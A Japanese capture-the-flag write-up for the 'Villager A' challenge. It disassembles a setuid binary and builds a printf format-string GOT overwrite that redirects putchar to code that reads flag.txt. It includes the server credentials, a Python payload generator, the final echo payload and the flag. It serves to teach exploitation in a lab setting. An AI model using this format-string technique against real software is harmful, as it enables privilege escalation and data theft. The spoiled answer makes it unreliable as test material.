Villager A 300pt
----------------

問題
----
> SSH: ctfq.sweetduet.info:10022
> ID: q4
> Pass: q60SIMpLlej9eq49

解き方
-----

まずはsshで接続してq4を実行してみます。

```bash
$ ssh q4@ctfq.sweetduet.info -p10022
The authenticity of host '[ctfq.sweetduet.info]:10022 ([49.212.153.157]:10022)' can't be established.
RSA key fingerprint is SHA256:0fY35u2bBWJhkKK9lu3jVQbhbN8Xtwmi4AV+QMPC0Ns.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[ctfq.sweetduet.info]:10022,[49.212.153.157]:10022' (RSA) to the list of known hosts.
q4@ctfq.sweetduet.info's password: 
Last login: Sun Dec 15 21:32:24 2019 from 10.0.2.2
[q4@localhost ~]$ ls -la
total 36
drwxr-xr-x.  2 root root 4096 May 22  2012 .
drwxr-xr-x. 17 root root 4096 Oct  6  2014 ..
-rw-r--r--.  1 root root   18 Dec  2  2011 .bash_logout
-rw-r--r--.  1 root root  176 Dec  2  2011 .bash_profile
-rw-r--r--.  1 root root  124 Dec  2  2011 .bashrc
-r--------.  1 q4a  q4a    22 May 22  2012 flag.txt
-rwsr-xr-x.  1 q4a  q4a  5857 May 22  2012 q4
-rw-r--r--.  1 root root  151 Jun  1  2012 readme.txt
[q4@localhost ~]$ ./q4 
What's your name?
abc
Hi, abc

Do you want the flag?
yes
Do you want the flag?
no
I see. Good bye.
```

`no`が入力されるまでループするプログラムのようです。main関数をダンプしてみます。

```bash
$ objdump -M intel -D q4|awk -v RS= '/^[[:xdigit:]]+ <main>/'
080485b4 <main>:
 80485b4:       55                      push   ebp
 80485b5:       89 e5                   mov    ebp,esp
 80485b7:       83 e4 f0                and    esp,0xfffffff0
 80485ba:       81 ec 20 04 00 00       sub    esp,0x420
 80485c0:       c7 04 24 a4 87 04 08    mov    DWORD PTR [esp],0x80487a4
 80485c7:       e8 f8 fe ff ff          call   80484c4 <puts@plt>
 80485cc:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
 80485d1:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80485d5:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
 80485dc:       00 
 80485dd:       8d 44 24 18             lea    eax,[esp+0x18]
 80485e1:       89 04 24                mov    DWORD PTR [esp],eax
 80485e4:       e8 9b fe ff ff          call   8048484 <fgets@plt> # 1
 80485e9:       c7 04 24 b6 87 04 08    mov    DWORD PTR [esp],0x80487b6
 80485f0:       e8 bf fe ff ff          call   80484b4 <printf@plt> # 2
 80485f5:       8d 44 24 18             lea    eax,[esp+0x18]
 80485f9:       89 04 24                mov    DWORD PTR [esp],eax
 80485fc:       e8 b3 fe ff ff          call   80484b4 <printf@plt>
 8048601:       c7 04 24 0a 00 00 00    mov    DWORD PTR [esp],0xa
 8048608:       e8 67 fe ff ff          call   8048474 <putchar@plt> # 3
 804860d:       c7 84 24 18 04 00 00    mov    DWORD PTR [esp+0x418],0x1
 8048614:       01 00 00 00 
 8048618:       eb 67                   jmp    8048681 <main+0xcd>
 804861a:       c7 04 24 bb 87 04 08    mov    DWORD PTR [esp],0x80487bb
 8048621:       e8 9e fe ff ff          call   80484c4 <puts@plt>
 8048626:       a1 04 9a 04 08          mov    eax,ds:0x8049a04
 804862b:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 804862f:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400
 8048636:       00 
 8048637:       8d 44 24 18             lea    eax,[esp+0x18]
 804863b:       89 04 24                mov    DWORD PTR [esp],eax
 804863e:       e8 41 fe ff ff          call   8048484 <fgets@plt>
 8048643:       85 c0                   test   eax,eax
 8048645:       0f 94 c0                sete   al
 8048648:       84 c0                   test   al,al
 804864a:       74 0a                   je     8048656 <main+0xa2>
 804864c:       b8 00 00 00 00          mov    eax,0x0
 8048651:       e9 86 00 00 00          jmp    80486dc <main+0x128>
 8048656:       c7 44 24 04 d1 87 04    mov    DWORD PTR [esp+0x4],0x80487d1
 804865d:       08 
 804865e:       8d 44 24 18             lea    eax,[esp+0x18]
 8048662:       89 04 24                mov    DWORD PTR [esp],eax
 8048665:       e8 7a fe ff ff          call   80484e4 <strcmp@plt>
 804866a:       85 c0                   test   eax,eax
 804866c:       75 13                   jne    8048681 <main+0xcd>
 804866e:       c7 04 24 d5 87 04 08    mov    DWORD PTR [esp],0x80487d5
 8048675:       e8 4a fe ff ff          call   80484c4 <puts@plt>
 804867a:       b8 00 00 00 00          mov    eax,0x0
 804867f:       eb 5b                   jmp    80486dc <main+0x128>
 8048681:       8b 84 24 18 04 00 00    mov    eax,DWORD PTR [esp+0x418]
 8048688:       85 c0                   test   eax,eax
 804868a:       0f 95 c0                setne  al
 804868d:       84 c0                   test   al,al
 804868f:       75 89                   jne    804861a <main+0x66>
 8048691:       c7 44 24 04 e6 87 04    mov    DWORD PTR [esp+0x4],0x80487e6 # 4 ここから
 8048698:       08 
 8048699:       c7 04 24 e8 87 04 08    mov    DWORD PTR [esp],0x80487e8
 80486a0:       e8 ff fd ff ff          call   80484a4 <fopen@plt>
 80486a5:       89 84 24 1c 04 00 00    mov    DWORD PTR [esp+0x41c],eax
 80486ac:       8b 84 24 1c 04 00 00    mov    eax,DWORD PTR [esp+0x41c]
 80486b3:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80486b7:       c7 44 24 04 00 04 00    mov    DWORD PTR [esp+0x4],0x400 # 4 ここまで
 80486be:       00 
 80486bf:       8d 44 24 18             lea    eax,[esp+0x18]
 80486c3:       89 04 24                mov    DWORD PTR [esp],eax
 80486c6:       e8 b9 fd ff ff          call   8048484 <fgets@plt>
 80486cb:       8d 44 24 18             lea    eax,[esp+0x18]
 80486cf:       89 04 24                mov    DWORD PTR [esp],eax
 80486d2:       e8 dd fd ff ff          call   80484b4 <printf@plt>
 80486d7:       b8 00 00 00 00          mov    eax,0x0
 80486dc:       c9                      leave  
 80486dd:       c3                      ret    
 80486de:       90                      nop
 80486df:       90                      nop
```

### 攻撃方法の確認
注釈1, 2で`fgets`, `printf`を使用しているので`prinf format attack`が出来るか確認してみます。

```bash
[q4@localhost ans]$ echo AAAA,%x,%x,%x,%x,%x,%x,%x,%x|./q4
What's your name?
Hi, AAAA,400,bf58c0,8,14,776fc4,41414141,2c78252c,252c7825

Do you want the flag?
```

`AAAA`が`41414141`として表示されたことで、成功したことが分かりました。

次に3のputchar関数をダンプすると`0x80499e0`を参照していることが分かります。。

putcharの任意のアドレスに書き換えられれば嬉しいです(putcharでなくても良いはず)。

```bash
[q4@localhost ans]$ objdump -M intel -D q4|awk -v RS= '/^[[:xdigit:]]+ <putchar@plt>/'
08048474 <putchar@plt>:
 8048474:       ff 25 e0 99 04 08       jmp    DWORD PTR ds:0x80499e0 # 5
 804847a:       68 08 00 00 00          push   0x8
 804847f:       e9 d0 ff ff ff          jmp    8048454 <_init+0x30>
```

ということで5 `0x80499e0`を4の開始アドレス `0x8048691`に書き換えることができれば、putcharを呼ぶタイミングでfopenを呼ぶことができそうです。

つまり、次のように書き換えれば良いです。
 - 0x80499e0: 0x91
 - 0x80499e1: 0x86
 - 0x80499e2: 0x04
 - 0x80499e3: 0x08

### 実際の手法
実際にこのようにメモリの書き換えには`GOT(Global Offset Table) overwrite attack`を行います。GOT overwriteは次の書式で行います。

```bash
$ echo '[値]%[数値]$hhn' | ./q4
$ echo 'AAAA%6$hhn' | ./q4 # スタックの6番目にAAAA(=41414141)を格納し、41414141に現在のprint出力バイト数4が格納される
$ echo 'AAAABBBB%7$hhn' | ./q4 # スタックの6番目にAAAA(=41414141), 7番目にBBBB(=42424242)を格納し、42424242に現在のprint出力バイト数8が格納される
```

例えば、アドレス`0x80499e0`を`0x91`にするには

 - アドレス: `\xe0\x99\x04\x08`(リトルエンディアンを考慮した`0x80499e0`) に出力バイト数(今回の文脈では`0x91`)を指定すれば良い
 - 出力バイト数は`\xe0\x99\x04\x08`の書き込みの時点で4なので、`0x91`=`145`までに残り`141`必要
 - `%[数値]c%`で出力バイト数が稼げるので`%141c%`を追加してやる

つまり出力すべき文字列は`\xe0\x99\x04\x08%141c%6$hhn`となります。

実際には`アドレス1アドレス2アドレス3アドレス4値1値2値3値4`と入力する必要があるのでそれらを考慮してプログラムを組んでやると良いです(手計算でも解けます)。

### 手計算

プログラムの解説記事が多いようなので手計算してみます。

変更すべきアドレスと値の変換表は次の通りです。
 - `0x80499e0`: `0x91` (`145`)
 - `0x80499e1`: `0x86` (`134`)
 - `0x80499e2`: `0x04` (`4`)
 - `0x80499e3`: `0x08` (`8`)

入力すべき文字列`アドレス1アドレス2アドレス3アドレス4値1値2値3値4` における`値1~値4`を求めます。

- 値1: `出力済みのバイト数 == アドレス1からアドレス4までの出力バイト数 == 4 * 4 == 16`なので、`145`まで`145-16=129`必要。つまり`%129c%6$hhn`
- 値2: `出力済みのバイト数 == 145`なので、`134`まで`134-145=-11`必要。つまり`%245%7$hhn`
    - 考慮される出力バイトは下位8bitまでしか評価されないので任意に256を追加して良いです(`256-11=245`)。
- 値3: `出力済みのバイト数 == 134`なので、`4`まで`4-134=-130`必要。つまり`%126%8$hhn`
- 値4: `出力済みのバイト数 == 4`なので、`8`まで`8-4=4`必要。つまり`%4%9$hhn`

よって入力すべき文字列は次の通りです。

`\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn`

### プログラム

```python
#!/usr/bin/env python3
start_address = 0x080499e0
values = '08048691'
number = 6

values = [values[i:i+2] for i in range(0, len(values), 2)]
values.reverse() # little endian
output = ''
byte_counter = 0

for i in range(len(values)):
    addr = f'{start_address+i:08x}'
    addrs = [addr[j:j+2] for j in range(0, len(addr), 2)]
    addrs.reverse()
    byte_counter += len(addrs)
    output += ''.join([f'\\x{a}' for a in addrs])

p_value = byte_counter
for i in range(len(values)):
    value = int(values[i], 16)
    number_of_char = value - p_value
    if number_of_char < 0: number_of_char += 256
    output += f'%{number_of_char}c%{number}$hhn'
    number += 1
    p_value = value
print(output)
```

### 結果

これをq4に流し込んでやると良いです。

```bash
echo -e '\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn'|./q4
```

FLAG 
-----
`FLAG_nwW6eP503Q3QI0zw`
